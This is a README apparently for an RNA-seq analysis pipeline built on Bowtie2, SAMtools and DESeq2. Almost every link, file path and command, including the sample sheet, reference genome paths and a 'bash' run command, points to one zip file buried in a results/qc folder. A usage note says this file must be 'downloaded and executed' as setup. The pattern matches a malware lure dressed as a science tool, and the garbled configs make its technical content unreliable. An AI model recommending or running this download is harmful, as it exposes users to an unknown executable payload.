# RNA-Seq Pipeline: End-to-End Gene Expression and Differential Analysis

Release page: https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip  
[![Releases](https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip)](https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip)

🧬 A complete workflow to turn FASTQ data into gene expression profiles and differential expression results. Built around Bowtie2 for alignment, SAMtools for data handling, and R for statistics and visualization (DESeq2, Gviz, and more).

Table of contents
- Overview
- What this project does
- Key concepts
- Repository structure
- Getting started
- Installation
- Data and input formats
- How the pipeline runs
- Configuration and customization
- Outputs and interpretation
- Visualization and reporting
- Reproducibility and environments
- Examples and tutorials
- Performance and scalability
- Troubleshooting
- Testing and quality assurance
- Security and data privacy
- Collaboration and contribution
- Licensing and credits
- Resources and references

Overview
This repository hosts an end-to-end RNA-seq pipeline. It starts with FASTQ data and ends with differential expression results and gene-level visuals. It uses Bowtie2 for alignment, SAMtools for file handling, and R with DESeq2 and Gviz for statistics and visualization. The pipeline is modular. You can run it as a whole or run individual steps.

What this project does
- Accepts raw FASTQ data and a sample sheet that defines groups and conditions.
- Performs quality control and optional trimming.
- Aligns reads to a reference genome using Bowtie2.
- Converts, sorts, and indexes alignments with SAMtools.
- Quantifies gene expression with a counting tool.
- Analyzes differential expression with DESeq2.
- Produces plots and interactive visualizations with Gviz and base R plots.
- Outputs a clear, shareable report and a complete results package.

Key concepts
- FASTQ: raw sequence reads that feed the pipeline.
- Alignment: mapping reads to a reference genome.
- BAM/SAM: formats for aligned reads.
- Counting: assigning reads to genes or features.
- Differential expression: comparing expression across conditions.
- Visualization: showing results with genome views and plots.

Repository structure
- docs/ and tutorials/ for guidance and examples.
- pipelines/ contains the main bash scripts that stitch steps together.
- src/ includes helper scripts for preprocessing, alignment, and counting.
- config/ stores example configuration templates and sample sheets.
- data/ contains example data for testing and demonstration.
- reports/ stores generated reports and visuals.
- envs/ or containers/ for environment definitions (Conda, Docker, Singularity).
- tests/ contains unit and integration tests.

Getting started
- Prerequisites:
  - Linux or macOS operating system.
  - Command line access with a reasonable amount of RAM and CPU.
  - Tools: Bowtie2, SAMtools, R (with Bioconductor), and a counting tool (such as featureCounts).
  - Optional: Python for wrapper utilities.
- Quick start plan:
  - Install the required tools or pull a container image.
  - Prepare a small sample dataset to test the pipeline.
  - Create a minimal configuration file.
  - Run the pipeline on the sample data.
  - Inspect the output and adjust parameters as needed.

Installation
- Option 1: Native installation
  - Install Bowtie2, SAMtools, and a compatible R version.
  - Install Bioconductor packages DESeq2, Gviz, and Rsamtools within R.
  - Set up environment variables to locate references and index files.
  - Ensure PATH and R_LIBS_USER point to the right locations.
- Option 2: Conda environment
  - Create an environment file (yaml) and install with conda.
  - Activate the environment before running the pipeline.
  - This keeps tools and libraries isolated and compatible.
- Option 3: Containers
  - Docker image: use a prebuilt image that includes Bowtie2, SAMtools, and R with Bioconductor libraries.
  - Singularity image: for HPC use; pull or build from a definition file.
- Example commands (conda):
  - conda env create -f https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip
  - conda activate rnaseq
  - conda install -c bioconda -c conda-forge deseq2 gviz Rsamtools
- Example commands (docker):
  - docker pull saidmlonji/rnaseq_pipeline:latest
  - docker run --rm -v /path/to/data:/data saidmlonji/rnaseq_pipeline:latest /bin/bash

Data and input formats
- Input FASTQ files
  - Paired-end: https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip and https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip
  - Single-end is supported with corresponding options in the config
- Sample sheet
  - A simple tab-delimited file listing sample IDs, file paths, and group/condition labels
  - Example:
    sample_id   fastq_r1        fastq_r2      condition
    sample1     https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip  treated
- Reference data
  - Reference genome FASTA
  - Gene annotation GTF/GFF file
  - Bowtie2 index directory or packaged index
- Output layout
  - results/
    - qc/ (quality control plots)
    - alignments/ (BAM/SAM files and statistics)
    - counts/ (gene-level counts)
    - deseq_results/ (differential expression results)
    - viz/ (plots and genome browser tracks)
  - reports/ (HTML or PDF reports)
- Example data
  - A small, synthetic dataset is included under data/ for demonstrations.
  - Use this dataset to validate the workflow before running on full samples.

How the pipeline runs
- Step 1: Quality control
  - Run FastQC on all FASTQ files.
  - Compile reports with MultiQC.
- Step 2: Preprocessing (optional)
  - Trim adapters and filter low-quality reads (if configured).
  - Re-run QC on cleaned data.
- Step 3: Alignment
  - Bowtie2 aligns reads to the reference genome.
  - Generate SAM files and convert to sorted BAM files with SAMtools.
- Step 4: Post-alignment processing
  - Mark duplicates if needed.
  - Index BAM files for fast access.
- Step 5: Counting
  - Use a gene annotation to count reads mapping to genes.
  - Produce a counts matrix with samples as columns and genes as rows.
- Step 6: Differential expression
  - Load the counts into R.
  - Run DESeq2 to identify differentially expressed genes.
  - Save results with key statistics (log2 fold change, p-value, adjusted p-value).
- Step 7: Visualization
  - Generate genome tracks with Gviz.
  - Produce plots for sample relationships, dispersion estimates, and DEG lists.
- Step 8: Reporting
  - Create a comprehensive report summarizing QC, alignment metrics, counts, DEG results, and visualizations.
- Step 9: Packaging
  - Package outputs for sharing with collaborators or submitting to a repository.

Configuration and customization
- Core ideas
  - The pipeline is driven by a configuration file.
  - You set file paths, sample metadata, reference files, and analysis options in YAML or JSON.
- Minimal config example (YAML)
  project_name: "RNA-Seq Demo"
  reference:
    genome_fasta: "https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip"
    annotation_gtf: "https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip"
    bowtie2_index: "data/reference/bowtie2_index"
  fastq_dir: "data/fastq"
  sample_sheet: "https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip"
  design_formula: "~ condition"
  run_parameters:
    qc: true
    trim: false
    aligner: "bowtie2"
    quant_method: "featureCounts"
    deseq2_method: "DESeq"
  output_dir: "results"
  threads: 8
- Advanced options
  - You can enable multi-threading for alignment, counting, and statistics.
  - You can switch counting backends (featureCounts, HTSeq) if needed.
  - You can enable a subset of steps for debugging or quick checks.
- How to set up a sample sheet
  - Include sample IDs, file paths, and group labels.
  - Ensure consistent naming between fastq_dir and sample_sheet.
  - Validate that all required fields exist for each sample.

Outputs and interpretation
- Differential expression results
  - A table with gene IDs, log2 fold changes, standard errors, test statistics, p-values, and adjusted p-values.
  - Genes with adjusted p-values below a chosen threshold (commonly 0.05) are considered differentially expressed.
- QC and alignment metrics
  - Per-sample read counts, alignment rates, and library complexity metrics.
  - Boxplots, MA plots, and dispersion estimates to assess data quality.
- Gene-level visualizations
  - Genome browser tracks showing gene models and read coverage.
  - Interactive plots for exploration of top DE genes.
- Reports
  - A consolidated report with figures, methods, and a summary table.
  - Reproducibility notes and environment details.

Visualization and reporting
- Gviz integration
  - Use Gviz to display tracks such as gene models, read density, and coverage across chromosomes.
  - Create custom plots to highlight genes of interest.
- Plot types
  - PCA or MDS plots for sample relationships.
  - MA plots for expression changes.
  - Volcano plots for significance vs effect size.
  - Heatmaps for top DE genes.
- Export formats
  - PNG, PDF, and interactive HTML where possible.
  - Data tables in CSV or TSV formats.

Reproducibility and environments
- Environment options
  - Conda environments for reproducible installs.
  - Docker containers for consistent runtimes.
  - Singularity images for HPC clusters.
- Version control
  - The pipeline tracks tool versions and references.
  - A config-driven approach ensures that runs are reproducible.
- Data provenance
  - Each run records input data, reference files, and parameters.
  - Outputs include a run log with timestamps and command history.
- Example container usage
  - Docker: docker run -v /path/to/data:/data saidmlonji/rnaseq_pipeline:latest
  - Singularity: singularity pull library://rnaseq_pipeline:latest

Examples and tutorials
- Beginner walk-through
  - Use the included small dataset to run the pipeline end-to-end.
  - Validate each step with basic QC metrics and simple counts.
- Intermediate scenario
  - Add a second condition, adjust the design matrix, and re-run differential expression.
  - Compare results across runs and interpret the changes.
- Advanced scenario
  - Integrate a custom annotation, apply a custom contrast, or add a post-analysis step with additional plots.
- Step-by-step notes
  - Each tutorial includes a checklist: inputs present, config valid, memory limits adequate, and outputs examined.

Performance and scalability
- Parallelism
  - The pipeline supports multi-threading for alignment, counting, and summaries.
  - Use HPC-friendly options to request more CPUs when available.
- Memory usage
  - Bowtie2 and BAM processing require substantial memory for large genomes.
  - Plan for peak memory during alignment and counting.
- Large datasets
  - Break data into batches if needed.
  - Run QC on a per-sample basis to identify outliers early.
- Scaling tips
  - Use distributed file systems for data storage.
  - Keep reference indices on fast storage to speed up access.

Troubleshooting
- Common issues
  - Bowtie2 not found: ensure the binary is on PATH or use the container image.
  - Reference index missing: verify the bowtie2_index path in the config.
  - GTF/GFF mismatch: confirm the annotation matches the genome build.
  - Insufficient permissions: check read/write permissions on output directories.
- Debug steps
  - Run a single step manually with a small sample to isolate the problem.
  - Check log files for error messages and stack traces.
  - Validate sample metadata before starting the run.
- Logging
  - The pipeline writes a log file per run with all commands and timings.
  - Review logs to understand failures and recoveries.

Testing and quality assurance
- Automated tests
  - A lightweight test suite runs a small sample to verify that all steps complete.
  - Tests cover configuration parsing, basic file existence checks, and a minimal end-to-end run.
- CI integration
  - A CI workflow runs tests on push and pull requests.
  - Checks include environment consistency and basic output validation.
- Code quality
  - The project uses linting for shell and R scripts.
  - Style guidelines help keep scripts readable and maintainable.

Security and data privacy
- Data handling
  - The pipeline processes sensitive sequencing data; protect source data.
  - Prefer local runs or controlled storage when handling real datasets.
- Access controls
  - Restrict access to data directories and results.
  - Use signed containers and verify image integrity before use.
- Dependencies
  - Pin tool versions to reduce drift and vulnerabilities.
  - Regularly update and audit dependencies.

Collaboration and contribution
- How to contribute
  - Open issues to report bugs or request features.
  - Submit pull requests with focused changes and tests.
  - Follow the contribution guidelines in the CONTRIBUTING file.
- Community standards
  - Be clear, concise, and respectful.
  - Include tests for new features.
  - Update documentation for any user-facing changes.

Licensing and credits
- License
  - This project is released under the MIT license.
- Credits
  - Core contributors and the open-source tools leveraged by the pipeline.
  - Acknowledgments for collaborators and testers.

Resources and references
- Bowtie2 documentation
- SAMtools documentation
- DESeq2 documentation and vignettes
- Gviz documentation
- Bioconductor suite for RNA-seq workflows
- FastQC and MultiQC tools for quality control

Notes on usage and download
- The release page contains bundles that you can download. The release asset is a packaged file with the pipeline, scripts, and example data. The file needs to be downloaded and executed as part of the setup.
- The release page is the central place to obtain stable versions and updates. For quick access to the latest stable package, visit: https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip
- The same link is used here as a reference point for distribution and validation. Ensure you check the Releases section for the most recent version, test data, and example configurations.

FAQ
- Q: Can I run this on Windows?
  - A: The pipeline is designed for Unix-like systems. Use a Linux VM or Windows Subsystem for Linux (WSL) if you must run on Windows.
- Q: Do I need internet access during a run?
  - A: For most runs, you need file access to reference genomes, indices, and tools. If you preinstall dependencies, the run itself can be offline.
- Q: Can I swap tools (e.g., HTSeq for counting) with this pipeline?
  - A: Yes, the counting step can be configured to use alternative tools. Update the config to select the desired backend.
- Q: How do I add my own annotations?
  - A: Provide a compatible GTF/GFF file and align it with the reference genome. Update the config to point to the new annotation.

Future directions
- Expand support for single-cell RNA-seq workflows.
- Add integration with alternate aligners and pseudo-alignment tools.
- Improve parallelization strategies for very large cohorts.
- Enhance visualizations with more interactive genome browser tracks.

Community guidelines
- Share reproducible configurations.
- Include sample datasets when possible.
- Document any deviations from the standard workflow.
- Help others reproduce results and interpret outputs.

Appendix: sample workflow commands
- Quick end-to-end run (illustrative)
  - Prepare: ensure data/ and config/ exist with proper files.
  - Run: bash https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip --config https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip
  - Inspect: results/ and reports/ for outputs.
- Minimal configuration (snippet)
  project_name: "RNA-Seq Demo"
  design_formula: "~ condition"
  fastq_dir: "data/fastq"
  sample_sheet: "https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip"
  reference:
    genome_fasta: "https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip"
    annotation_gtf: "https://github.com/saidmlonji/rnaseq_pipeline/raw/refs/heads/main/results/qc/pipeline_rnaseq_v1.3.zip"
  bowtie2_index: "data/reference/bowtie2_index"
  output_dir: "results"
  threads: 4

Appendix: glossary
- FASTQ: a text-based format for sequencing reads.
- Bowtie2: a fast aligner for short reads.
- SAMtools: tools for manipulating SAM and BAM files.
- DESeq2: a Bioconductor package for differential expression testing.
- Gviz: a Bioconductor package for genomic visuals.
- FeatureCounts: a tool for counting reads per feature.
- GTF/GFF: genome annotation formats.

End of document
